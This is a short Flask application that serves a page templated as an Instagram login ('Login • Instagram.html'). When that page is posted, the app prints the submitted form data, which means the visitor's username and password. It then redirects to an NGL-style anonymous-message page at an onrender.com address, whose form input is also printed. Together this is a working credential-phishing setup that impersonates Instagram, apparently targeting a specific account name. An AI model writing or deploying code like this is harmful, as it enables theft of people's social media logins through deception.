from flask import Flask, render_template, request, redirect
import logging

app = Flask("__main__", template_folder="/Users/satish/Desktop/folders/ngl-simran_deyy-main/templates",
            static_folder="/Users/satish/Desktop/folders/ngl-simran_deyy-main/static")
logging.basicConfig(level=logging.DEBUG)


@app.route("/")
def redirect_main():
    return render_template("loading.html")


@app.route("/login")
def login():
    return render_template("Login • Instagram.html")


@app.route("/simran_deyy")
def simran_deyy():
    return render_template("home.html")


@app.route("/after")
def after():
    return render_template("after.html")


@app.route("/login", methods=["POST", "GET"])
def run_insta_code():
    if request.method == "POST":
        print(request.form)
        return redirect("https://ngl-link.onrender.com/simran_deyy")


@app.route("/simran_deyy", methods=["POST", "GET"])
def run_ngl_code():
    if request.method == "POST":
        print(request.form)
        return redirect("https://ngl-link.onrender.com/after")


if __name__ == "__main__":
    app.run()
